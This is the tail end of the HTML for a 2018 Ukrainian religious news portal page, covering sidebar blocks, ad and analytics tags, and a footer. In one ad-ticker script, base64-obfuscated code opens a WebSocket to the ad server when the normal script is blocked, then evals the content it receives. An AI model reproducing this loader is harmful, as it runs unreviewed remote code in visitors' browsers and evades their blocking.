  *   'http://risu.org.ua/openx/www/delivery/...'
  * to
  *   'https://risu.org.ua/openx/www/delivery/...'
  *
  * This noscript section of this tag only shows image banners. There
  * is no width or height in these banners, so if you want these tags to
  * allocate space for the ad before it shows, you will need to add this
  * information to the <img> tag.
  *
  * If you do not want to deal with the intricities of the noscript
  * section, delete the tag (from <noscript>... to </noscript>). On
  * average, the noscript tag is called from less than 1% of internet
  * users.
  */-->

<script type='text/javascript'><!--//<![CDATA[
   var m3_u = (location.protocol=='https:'?'https://risu.org.ua/openx/www/delivery/ajs.php':'http://risu.org.ua/openx/www/delivery/ajs.php');
   var m3_r = Math.floor(Math.random()*99999999999);
   if (!document.MAX_used) document.MAX_used = ',';
   document.write ("<scr"+"ipt type='text/javascript' src='"+m3_u);
   document.write ("?zoneid=5");
   document.write ('&amp;cb=' + m3_r);
   if (document.MAX_used != ',') document.write ("&amp;exclude=" + document.MAX_used);
   document.write (document.charset ? '&amp;charset='+document.charset : (document.characterSet ? '&amp;charset='+document.characterSet : ''));
   document.write ("&amp;loc=" + escape(window.location));
   if (document.referrer) document.write ("&amp;referer=" + escape(document.referrer));
   if (document.context) document.write ("&context=" + escape(document.context));
   if (document.mmm_fo) document.write ("&amp;mmm_fo=1");
   document.write ("'></scr"+"ipt>");
//]]>--></script><noscript><a href='http://risu.org.ua/openx/www/delivery/ck.php?n=a93bb63d&amp;cb=INSERT_RANDOM_NUMBER_HERE' target='_blank'><img src='http://risu.org.ua/openx/www/delivery/avw.php?zoneid=5&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;n=a93bb63d' border='0' alt='' /></a></noscript></div></div></div><div class="robots-nocontent item column" id="sidebar-right"><div id="rightContent"><div class=robots-nocontent><div class=portlet-position style="width:100%"></div><div class="contentItem composite-banner"><div class="ltc"></div><div class="rtc"></div><div class="banner-buttons"><div class="banner-button" title="Релігійний туризм"><div class="contentItem banner"><a href="http://www.risu.org.ua/ua/relig_tourism" target="_blank" ><img src="php_uploads/images/portlets/PortletImage_UA_191.png" alt="" ></a></div></div><div class="banner-button" title="Старий портал РІСУ"><div class="contentItem banner"><a href="http://old.risu.org.ua/ukr/" target="_blank"  rel="nofollow" ><img src="php_uploads/images/portlets/PortletImage_UA_189.png" alt="" ></a></div></div><div class="banner-button" title="Бібліотека"><div class="contentItem banner"><noindex><a href="http://www.risu.org.ua/ua/library" target="_blank" ><img src="php_uploads/images/portlets/PortletImage_UA_190.png" alt="" ></a></noindex></div></div><div class="banner-button" title="Богословський портал"><div class="contentItem banner"><a href="http://theology.in.ua/ua/bp" target="_blank"  rel="nofollow" ><img src="php_uploads/images/portlets/PortletImage_UA_188.png" alt="" ></a></div></div><div class="banner-button" title="Підписка"><div class="contentItem banner"><a href="http://www.risu.org.ua/ua/index/about_us/portal_news/20050/"><img src="php_uploads/images/portlets/PortletImage_UA_192.png" alt="" ></a></div></div><div class="banner-button" title="Підтримати РІСУ"><div class="contentItem banner"><a href="http://risu.org.ua/ua/index/about_us/donation"><img src="php_uploads/images/portlets/PortletImage_UA_193.png" alt="" ></a></div></div></div><div class="description"></div><div class="shadow"></div></div><div class=portlet-position style="width:100%"></div><div class="contentItem banner"><noindex><iframe width="339" height="145" seamless frameborder="0" scrolling="no" src="https://docs.google.com/spreadsheets/d/e/2PACX-1vTkwS_vvXZ5vLNn3GEUTtDzPs3Yz8vabTrOIug3SUMUxRncAOIFTvTTvw8UCgKEXoUi-Kbo5SeOVH8l/pubchart?oid=5&amp;format=interactive"></iframe>
<a href="https://risu.org.ua/ua/index/about_us/editorialnews/69927/" target="_blank" style="text-decoration: none;margin-bottom: 20px"><h2>Щоб підтримати, натисніть сюди!</h2></a><hr/></noindex></div><div class=portlet-position style="width:100%"></div><div class=portlet-position style="width:100%"></div><div class="contentItem banner"><noindex><a href="https://risu.org.ua/ua/index/all_news/announcements_events/70000/" target="_blank" ><img src="php_uploads/images/portlets/PortletImage_UA_349.jpeg" alt="" ></a></noindex></div><div class=portlet-position style="width:100%"></div><div class="contentItem banner"><noindex><a href="http://risu.org.ua/ua/index/spiritual_culture/lithurgy/great_lent" target="_blank" ><img src="php_uploads/images/portlets/PortletImage_UA_269.jpg" alt="" ></a></noindex></div><div class=portlet-position style="width:100%"></div><div class="contentItem infoBlockMain imageGallery"><div class="topBar grey"><div class="navi"><a class="toLeft" href="#" onclick="return false;"></a><a class="toRight" href="#" onclick="return false;"></a></div><div class="ltc"></div><div class="rtc"></div><h1>Останні фото і відео</h1><div class="inside"><p class='imgWrap'><a href="https://risu.org.ua/ua/index/exclusive/photogallery/risu_video/69815" 
 ><img src="php_uploads/images/files/thumb_FilePreview_1825.jpg" alt="" ></a></p><p class='photoDesc'>Єпископ УГКЦ Йосип Сліпий проводить Богослужіння під час свята Водохреща у Львові. 1942</p><p class='galleryInfo'>фото&nbsp;<span class="pos">1</span>/1</p></div></div><div class="shadow"></div><div class="more"><a href="https://risu.org.ua/ua/index/exclusive/photogallery/risu_video/69815" 
 >Перейти до фотогалереї</a></div></div><div class=portlet-position style="width:100%"></div><div class="contentItem infoBlockMain blogs"><div class="topBar yellow"><div class=ltc></div><div class=rtc></div><h1>Блоги</h1></div><div class=shadow></div><ul><li><a class=thumb><img src="php_uploads/images/visitors/VisitorPhoto_1118.jpg" alt="" ></a><p class='attributes'><span class=date>15 березня 2018, 19:32</span>&nbsp;|&nbsp;<span class=comments></span></p><p><a href="https://risu.org.ua/ua/index/blog/~Petro+Balog"><b>Блог о. Петра Балога</b></a></p><p><a href="https://risu.org.ua/ua/index/blog/~Petro+Balog/70447/">ПЕРВОРОДНИЙ ГРІХ ТА БЛАГОДАТЬ</a></p></li><li><a class=thumb><img src="php_uploads/images/visitors/VisitorPhoto_1118.jpg" alt="" ></a><p class='attributes'><span class=date>13 березня 2018, 14:22</span>&nbsp;|&nbsp;<span class=comments></span></p><p><a href="https://risu.org.ua/ua/index/blog/~Petro+Balog"><b>Блог о. Петра Балога</b></a></p><p><a href="https://risu.org.ua/ua/index/blog/~Petro+Balog/70404/">ПРО «БЛАГОДАТНИЙ ВОГОНЬ»</a></p></li><li><a class=thumb><img src="php_uploads/images/visitors/VisitorPhoto_1538.jpg" alt="" ></a><p class='attributes'><span class=date>9 березня 2018, 15:24</span>&nbsp;|&nbsp;<span class=comments></span></p><p><a href="https://risu.org.ua/ua/index/blog/~Luca"><b>Блог єромонаха Луки</b></a></p><p><a href="https://risu.org.ua/ua/index/blog/~Luca/68386/">ДІАЛОГИ: Великий Піст - важливі траекторії життя Церкви</a></p></li><li><a class=thumb><img src="php_uploads/images/visitors/VisitorPhoto_1712.jpg" alt="" ></a><p class='attributes'><span class=date>7 березня 2018, 19:21</span>&nbsp;|&nbsp;<span class=comments></span></p><p><a href="https://risu.org.ua/ua/index/blog/~mykhaylo"><b>Блог Михайла Якубовича</b></a></p><p><a href="https://risu.org.ua/ua/index/blog/~mykhaylo/70356/">The Rise of Islamophobia in Ukraine? Search in Islamic Cultural Center in Kyiv</a></p></li><li><a class=thumb><img src="php_uploads/images/visitors/VisitorPhoto_3653.jpg" alt="" ></a><p class='attributes'><span class=date>5 березня 2018, 17:08</span>&nbsp;|&nbsp;<span class=comments></span></p><p><a href="https://risu.org.ua/ua/index/blog/~zensver"><b>Блог Зиновія Свереди</b></a></p><p><a href="https://risu.org.ua/ua/index/blog/~zensver/70324/">Як збудувати рідну хату на принципах СДЦ</a></p></li></ul><div class=more><a href="https://risu.org.ua/ua/index/blog">Усі блоги</a></div></div><div class=portlet-position style="width:100%"></div><div class="contentItem infoBlockMain"><div class="topBar yellow"><div class="ltc"></div><div class="rtc"></div><h1>#НеФормат</h1></div><div class="shadow"></div><ul><li class="important"><a href="https://risu.org.ua/ua/index/neformat/70374/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_70374.jpg" alt="" ></a><p class="attributes"><span class="date">9 березня 2018, 14:36</span>&nbsp;|&nbsp;<span class="category">#НеФормат</span> |
 <a class="hasPhotos"><img alt="view photo" src="im/icon_photo.gif"></img></a>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/neformat/70374/">Шевченко і німці: хто і відколи садив картоплю на Січі</a></p><p>Понад 200 років тому на землях війська Запорізького оселилися колоністи з Німеччини, які належали до протестантської церкви менонітів. Саме про них у своїх творах згадує Тарас Шевченко.</p></li><li><a href="https://risu.org.ua/ua/index/neformat/70184/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_70184.jpg" alt="" ></a><p class="attributes"><span class="date">22 лютого 2018, 11:43</span>&nbsp;|&nbsp;<span class="category">#НеФормат</span>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/neformat/70184/">Вже на 11-13 день посту в організмі настають позитивні зміни, стверджують лікарі</a></p><p>Триває Великий піст. Лікарі стверджують, що вже на 11-13 день посту суттєво покращуються показники здоров'я – нормалізується рівень холестерину, гемоглобіну, вага, тиск.</p></li><li class="important"><a href="https://risu.org.ua/ua/index/monitoring/kaleido_digest/70176/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_70176.jpg" alt="" ></a><p class="attributes"><span class="date">21 лютого 2018, 13:31</span>&nbsp;|&nbsp;<span class="category">Калейдоскоп-дайджест</span> |
 <a class="hasPhotos"><img alt="view photo" src="im/icon_photo.gif"></img></a>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/monitoring/kaleido_digest/70176/">Поради на час Великого Посту від відомих священиків</a></p><p>Всі без винятку релігійні традиції припускають самообмеження в їжі та інших тілесних потребах і радощах</p></li></ul><div class="more"></div></div><div class=portlet-position style="width:100%"></div><div class="contentItem infoBlockMain"><div class="topBar yellow"><div class="ltc"></div><div class="rtc"></div><h1>Анонси подій</h1></div><div class="shadow"></div><ul><li><p><span><a href="https://risu.org.ua/ua/index/all_news/community/young_people/70400/">Вперше в Україні, у Львові, відбудеться зустріч Тезе</a></span><span class="attributes"> |
 <span class="date">13 березня 2018, 12:17</span>&nbsp;|&nbsp;<span class="category">Діти, молодь і релігія</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li class="important"><p><span><a href="https://risu.org.ua/ua/index/all_news/announcements_events/70257/">Кафедра літургійних наук УКУ запрошує на відкритий семінар австрійського професора Гаральда Бухінгера</a></span><span class="attributes"> |
 <span class="date">28 лютого 2018, 12:00</span>&nbsp;|&nbsp;<span class="category">Анонси</span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/announcements_events/70138/">УКУ проведе у Києві дискусію &quot;Рецидиви несвободи у Східній Європі. Зміни польської політики пам’яті&quot;</a></span><span class="attributes"> |
 <span class="date">19 лютого 2018, 11:26</span>&nbsp;|&nbsp;<span class="category">Анонси</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/community/conferences/70096/">У Львові стартує проект «Діалог для побудови миру: сприяння міжрелігійній толерантності між релігійними громадами України»</a></span><span class="attributes"> |
 <span class="date">14 лютого 2018, 13:24</span>&nbsp;|&nbsp;<span class="category">Конференції, семінари, дослідження</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/announcements_events/70068/">Студентів та молодих науковців запрошують взяти участь у Міжнародній конференції про культуру діалогу</a></span><span class="attributes"> |
 <span class="date">12 лютого 2018, 12:53</span>&nbsp;|&nbsp;<span class="category">Анонси</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li></ul><div class="more"></div></div><div class=portlet-position style="width:100%"></div><div class="contentItem infoBlockMain poll"><div class="topBar yellow"><div class="ltc"></div><div class="rtc"></div><h1>Опитування</h1></div><div class="shadow"></div><div class="inside"><p>Наразі немає активних опитувань</p></div><div class="more"><a href="https://risu.org.ua/ua/index/vox_populi" 
 >Попередні опитування</a></div></div><div class=portlet-position style="width:100%"></div><div class="contentItem infoBlockMain calendar"><div class="topBar yellow"><div class="ltc"></div><div class="rtc"></div><h1>Календар</h1></div><div class="shadow"></div><div id="calendar_1_container"></div><script language="javascript">
      $(function() {
        ScriptLoader.requireScripts(['calendar'], function(){
        var call = new YAHOO.widget.Calendar("calendar_1","calendar_1_container", {selected:'03/17/2018', pagedate: '03/2018'});
 var links = 
  {
 1519855200:"https://risu.org.ua/ua/index/resourses/calendar/2018-03-01" }
 ;
 //set ukr locale
 call.cfg.setProperty ("MONTHS_SHORT", ["Сiч", "Лют", "Бер", "Кв", "Тр", "Чер", "Лип", "Сер", "Вер", "Жов", "Лист", "Гр"]);
  call.cfg.setProperty ("MONTHS_LONG", ["Сiчень", "Лютий", "Березень", "Квiтень", "Травень", "Червень", "Липень", "Серпень", "Вересень", "Жовтень", "Листопад", "Грудень"]);
  call.cfg.setProperty ("WEEKDAYS_SHORT", ["Нд", "Пн", "Вт", "Ср", "Чт", "Пт", "Сб"]);
 call.cfg.setProperty ("WEEKDAYS_MEDIUM", ["Нд", "Пн", "Вт", "Ср", "Чт", "Пт", "Сб"]);
 call.cfg.setProperty ("WEEKDAYS_LONG", ["Недiля", "Понедiлок", "Вiвторок", "Середа", "Четвер", "П'ятниця", "Субота"]);
 call.cfg.setProperty("START_WEEKDAY", 1);
 call.cfg.setProperty("show_weekdays", false);
 //Override the doCellMouseOver function (used for IE) to add row highlighting)
 call.renderCellDefault = function(workingDate, cell) {
 //if(workingDate.getDate() == 25) debugger;
 var date = new Date(workingDate.getFullYear(), workingDate.getMonth(), workingDate.getDate());
 var time = date.getTime() / 1000;
 if(links[time]) {
 YAHOO.util.Dom.addClass(cell, "hasEvent");
 cell.innerHTML = '<a href="' + links[time] + '">' + workingDate.getDate() + '</a>';
 } else {
	cell.innerHTML = workingDate.getDate();
 YAHOO.util.Dom.removeClass(cell, "selectable");
 }
	return YAHOO.widget.Calendar.STOP_RENDER;
 };
 call.changePageEvent.subscribe(function(type,args) {
 var date = args[1];
 date.setMinutes(0);
 date.setSeconds(0);
 date.setHours(0);
 var time = date.getTime() / 1000;
 if(!links[time]) {
 $.getJSON('geteventsmap.php', {name: 'calendar', time : time}, function(data) {
 for(var time in data)
 links[time] = data[time];
 call.render();
 });
 }
	});
 call.render();
 });
 });
 </script><div class="todayDate">17 березня</div><ul class="eventList"></ul><div class="more"><a href="https://risu.org.ua/ua/index/resourses/calendar" 
 >Весь календар</a></div></div><div class=portlet-position style="width:100%"></div><div class="contentItem infoBlockMain"><div class="topBar yellow"><div class="ltc"></div><div class="rtc"></div><h1>Прохання про допомогу</h1></div><div class="shadow"></div><ul><li class="important"><a href="https://risu.org.ua/ua/index/projects/help_children/69101/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_69101.jpg" alt="" ></a><p class="attributes"><span class="date">23 листопада 2017, 12:18</span>&nbsp;|&nbsp;<span class="category">Допоможіть дитині</span>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/projects/help_children/69101/">Допоможіть зібрати кошти для лікування Ангеліни Костюк</a></p><p>17-річній дівчині Ангеліні Костюк, яка має захворювання на муковісцидоз і зараз знаходиться знову в лікарні через неможливість вільно дихати без апарату штучного дихання, німецька клініка, яка оглянула результати аналізів та виписні епікризи, дала погодження на ретельну діагностику та подальші лікування.</p></li><li class="important"><a href="https://risu.org.ua/ua/index/projects/help_children/68555/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_68555.jpg" alt="" ></a><p class="attributes"><span class="date">10 жовтня 2017, 10:02</span>&nbsp;|&nbsp;<span class="category">Допоможіть дитині</span>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/projects/help_children/68555/">«Плачемо всією сім’єю, а донечка каже, що у неї рак-неборак», - батьки просять допомогти вилікувати їх Діанку-веселунку</a></p><p>Діанці Геряк діагностували страшну хворобу – рак ока. Батькам дуже потрібна допомога усіх небайдужих. Саме зараз вониу пошуках надійної клініки та збирають кошти на обстеження.</p></li></ul><div class="more"></div></div><div class=portlet-position style="width:100%"></div><div class="contentItem banner"><iframe src="http://www.facebook.com/plugins/likebox.php?href=http%3A%2F%2Fwww.facebook.com%2Frisu.russian%23%21%2Fpages%2FReligijno-informacijna-sluzba-Ukraini%2F284036313158&amp;width=337&amp;colorscheme=light&amp;connections=10&amp;stream=false&amp;header=false&amp;height=280" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:337px; height:280px;" allowTransparency="true"></iframe></div><div class=portlet-position style="width:100%"></div><div class="contentItem banner"><noindex><script id="r35164" type="text/javascript">
    (function() {
        var worker35164,
            tickerID = 35164,
            tag = document.getElementById('r'+ tickerID),
            id = (function(tickerID) {
                var now = Math.floor((new Date()).getTime() / 1000 / 3600) * 3600;
                if ('btoa' in window)
                    return btoa('g4p_'+ tickerID +'_'+ now).replace(/[^a-zA-Z0-9]/, '');
                return 'g4p_'+ tickerID +'_'+ now;
            })(tickerID);
        
        var container = document.createElement('div');
            container.id = id;
            container.innerHTML = 'загрузка...';
        tag.parentNode.insertBefore(container, tag);

        var script = document.createElement('script');
            script.src = '//js-ua.redtram.com/n4p/0/35/ticker_35164.js';
            script.type = 'text/javascript';
            script.charset = 'utf-8';
            script.onerror = function() {
                if (!('atob' in window && 'Worker' in window))
                    return;
                window.rtIsWebSocket = true;

                var code = 'dmFyIHNvY2tldDsgZnVuY3Rpb24gc2VuZFRvU29ja2V0KGRhdGEpIHsgdmFyIHdzc1VybCA9ICJ3c3M6Ly9uNHAucmVkdHJhbS5jb20vd3MvIjsgaWYgKCFzb2NrZXQgfHwgc29ja2V0LnJlYWR5U3RhdGUgPT09IHNvY2tldC5DTE9TRUQpIHsgc29ja2V0ID0gbmV3IFdlYlNvY2tldCh3c3NVcmwpOyBzb2NrZXQub25tZXNzYWdlID0gZnVuY3Rpb24ocikgeyBwb3N0TWVzc2FnZShKU09OLnN0cmluZ2lmeShyLmRhdGEpKTsgfTsgfSBpZiAoc29ja2V0KSB7IHNlbmRDb25uZWN0aW9uKHNvY2tldCwgZnVuY3Rpb24oKSB7IHNvY2tldC5zZW5kKGRhdGEpOyB9KTsgfSB9IGZ1bmN0aW9uIHNlbmRDb25uZWN0aW9uKGMsIHIpIHsgc2V0VGltZW91dChmdW5jdGlvbigpIHsgaWYgKGMucmVhZHlTdGF0ZSA9PT0gYy5PUEVOKSB7IHJldHVybiByKCk7IH0gcmV0dXJuIHNlbmRDb25uZWN0aW9uKGMsIHIpOyB9LCA1MCk7IH0gb25tZXNzYWdlID0gZnVuY3Rpb24ocikgeyBzZW5kVG9Tb2NrZXQoci5kYXRhKTsgfTsg';

                function runExternalMessage(data) {
                    worker35164.postMessage(data);
                }

                worker35164 = new Worker(URL.createObjectURL(
                    new Blob(["eval(atob('"+code+"'))"], {type: 'text/javascript'})
                ));

                worker35164.onmessage = function(m) {
                    var json = JSON.parse(m.data),
                        content = JSON.parse(json)['content'];
                    eval(content);
                };

                worker35164.postMessage(JSON.stringify({
                    command: 'init',
                    informer_id: tickerID,
                    url: script.src
                }));
            };
        tag.parentNode.insertBefore(script, tag);
    })();
</script></noindex></div><div class=portlet-position style="width:100%"></div><div class="contentItem infoBlockMain"><div class="topBar grey"><div class="ltc"></div><div class="rtc"></div><h1>Посилання від партнерів</h1></div><div class="shadow"></div><div class="sape-buttons" style="width:335px;"><!--lm_php_ver=1.5--><!-- <ml_code></ml_code> --><!--<ml_code_response><ml_getver>6.3.3</ml_getver></ml_code_response>--><!-- <ml_code></ml_code> --><!--<ml_code_response><ml_getver>6.3.3</ml_getver></ml_code_response>--><!--714378005320--><!--8bf9b81e--><!--931b8b8d--><!--9c7ec26b--><!--da5bb5de--><!--<ingots><ingots><ingots_version>2.2</ingots_version></ingots></ingots>--><!--<ingots><ingots><ingots_fversion>2.2f</ingots_fversion></ingots></ingots>--><!--<kappusto><kappusto><kappusto_version>1.3.3</kappusto_version></kappusto></kappusto>--><megaindex_noindex></megaindex_noindex><!--35aab--><!-- links will appear here -->

<script async="async" src="https://w.uptolike.com/widgets/v1/zp.js?pid=1292993" type="text/javascript"></script>
<script type="text/javascript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>

</div></div></div></div></div></div><noindex><div id="footerline" class="robots-nocontent line"><div class="item" id="footer"><div class="contentItem footer"><div class="inside"><div class="footLeft"><p>&copy; РІСУ - Релігійно-інформаційна служба України, 2001-2018<br />РІСУ є проектом <a href="http://www.ucu.edu.ua/irs" target="_blank">Інституту Релігії та Суспільства</a><br /><a href="http://www.ucu.edu.ua/" target="_blank" rel="nofollow">Українського Католицького Університету</a></p></div><div class="footRight"><p>
                  Авторське право на матеріали Релігійно-інформаційної служби України захищається законом.<br />
                  Вони можуть буть використані повністю чи частково лише за умови посилання на РІСУ.<br />
                  У разі використання їх в Інтернеті — обов'язкове гіперпосилання на risu.org.ua
                </p></div><div class="designBy">розроблено<br></br><a title="e-design" href="http://e-design.com.ua/" target="_blank"></a></div></div></div></div></div></noindex><div class="robots-nocontent bottombanners"><ul><li><!--bigmir)net TOP 100-->
<script type="text/javascript" language="javascript">
function BM_Draw(oBM_STAT){
document.write('<table cellpadding="0" cellspacing="0" border="0" style="display:inline;margin-right:4px;"><tr><td><div style="margin:0;padding:0;font-size:1px;width:88px;"><div style="background:url(\'//i.bigmir.net/cnt/samples/diagonal/b59_top.gif\') no-repeat top;height:1px;line-height:1px;"> </div><div style="font:10px Tahoma;text-align:center;background-color:#EFEFEF;height:15px;"><a href="http://www.bigmir.net/" target="_blank" style="color:#0000ab;text-decoration:none;">bigmir<span style="color:#ff0000;">)</span>net</a></div><div style="height:1px;background:url(\'//i.bigmir.net/cnt/samples/diagonal/b59_top.gif\') no-repeat bottom;"></div><div style="font:10px Tahoma;padding-left:7px;background:url(\'//i.bigmir.net/cnt/samples/diagonal/b59_center.gif\');"><div style="padding:4px 6px 0 0;"><div style="float:left;color:#969696;">хиты</div><div style="float:right;color:#003596;font:10px Tahoma;">'+oBM_STAT.hits+'</div></div><br clear="all" /><div style="padding-right:6px;"><div style="float:left;color:#969696;">хосты</div><div style="float:right;color:#003596;font:10px Tahoma;">'+oBM_STAT.hosts+'</div></div><br clear="all" /><div style="padding-right:6px;"><div style="float:left;color:#969696;">всего</div><div style="float:right;color:#003596;font:10px Tahoma;">'+oBM_STAT.total+'</div></div><br clear="all" /><div style="height:3px;"></div></div><div style="background:url(\'//i.bigmir.net/cnt/samples/diagonal/b59_bottom.gif\') no-repeat top;height:2px;line-height:1px;"> </div></div></td></tr></table>');
}
</script>
<script type="text/javascript" language="javascript">
bmN=navigator,bmD=document,bmD.cookie='b=b',i=0,bs=[],bm={o:1,v:114868,s:114868,t:0,c:bmD.cookie?1:0,n:Math.round((Math.random()* 1000000)),w:0};
for(var f=self;f!=f.parent;f=f.parent)bm.w++;
try{if(bmN.plugins&&bmN.mimeTypes.length&&(x=bmN.plugins['Shockwave Flash']))bm.m=parseInt(x.description.replace(/([a-zA-Z]|\s)+/,''));
else for(var f=3;f<20;f++)if(eval('new ActiveXObject("ShockwaveFlash.ShockwaveFlash.'+f+'")'))bm.m=f}catch(e){;}
try{bm.y=bmN.javaEnabled()?1:0}catch(e){;}
try{bmS=screen;bm.v^=bm.d=bmS.colorDepth||bmS.pixelDepth;bm.v^=bm.r=bmS.width}catch(e){;}
r=bmD.referrer.replace(/^w+:\/\//,'');if(r&&r.split('/')[0]!=window.location.host){bm.f=escape(r).slice(0,400);bm.v^=r.length}
bm.v^=window.location.href.length;for(var x in bm) if(/^[ovstcnwmydrf]$/.test(x)) bs[i++]=x+bm[x];
bmD.write('<sc'+'ript type="text/javascript" language="javascript" src="//c.bigmir.net/?'+bs.join('&')+'"></sc'+'ript>');
</script>
<noscript>
<a href="http://www.bigmir.net/" target="_blank"><img src="//c.bigmir.net/?v114868&s114868&t2" width="88" height="31" alt="bigmir)net TOP 100" title="bigmir)net TOP 100" border="0" /></a>
</noscript>
<!--bigmir)net TOP 100--></li></ul></div></div><script type="text/javascript">
         var _gaq = _gaq || [];
          _gaq.push(['_setAccount', 'UA-11950234-1']);
 _gaq.push(['_trackPageview']);

 $(function() {
 var ga = document.createElement('script');
 ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
 ga.setAttribute('async', 'true');
 document.documentElement.firstChild.appendChild(ga);
 });
 </script><script type="text/javascript">
      $(function() {
        FB.init({appId: '123665507667500', status: true, cookie: true, xfbml: true});
 
 });
 </script></body></html>